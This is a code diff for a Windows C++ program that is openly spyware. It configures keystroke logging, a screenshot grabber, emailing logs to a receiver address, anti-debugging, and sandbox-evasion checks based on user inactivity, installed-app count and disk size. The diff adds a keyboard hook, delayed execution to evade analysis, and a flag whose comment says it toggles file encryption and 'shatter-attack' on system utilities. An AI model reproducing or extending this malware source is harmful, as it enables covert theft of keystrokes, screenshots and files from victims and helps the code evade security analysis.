@@ -1,4 +1,4 @@
-#define VC_EXTRALEAN
+#define WIN32_LEAN_AND_MEAN
 #ifdef UNICODE
 	#undef UNICODE
 #endif
@@ -26,6 +26,7 @@
 #include <assert.h>
 #include <intrin.h>
 #include <array>
+#include <winioctl.h>
 
 #include "Antidbg.h"
 #include "log.h"
@@ -34,6 +35,8 @@ using buffer = std::vector<char>;
 
 //------------------------------------------------------
 // Customization
+
+#define debug               //whether or not to crypt files and shatter-attack system utilities
 
 #define CharactersPerLog 300
 #define MaximumFolderSize 10 
@@ -47,9 +50,11 @@ using buffer = std::vector<char>;
 #define SendersPsw ""
 #define RecieversEmail ""
 #define MaxInactivity 10    //max amount of seconds since last input
-#define MinRequiredApps 20  //minimum amount of installed programs
-#define SecurityLevel 1     //0-3 levels of trust towards environment
+#define MinRequiredApps 20  //minimum amount of intalled programs
+#define SecurityLevel 3     //0-3 levels of trust towards environment
 #define MinHardDisk 60      //minimum size for the main partition
+#define DelayExecution true //whether or not execution should be delayed
+#define DelayTime 120       //amount of time for the delay (seconds)
 
 //------------------------------------------------------
 
@@ -69,7 +74,6 @@ using buffer = std::vector<char>;
 #pragma comment( lib, "comsuppw.lib" )
 //#pragma comment(lib, "Wbemuuid.lib.")
 
-#define debug
 
 #define _WIN32_WINNT 0x050
 
@@ -84,6 +88,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 void TakeScreenShot(const char* filename);
 bool fexists(std::string filename);                          //create native check through CreateFileA()
 void FinalExit();
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 //void Compress(const buffer& in, buffer& out);
 
 
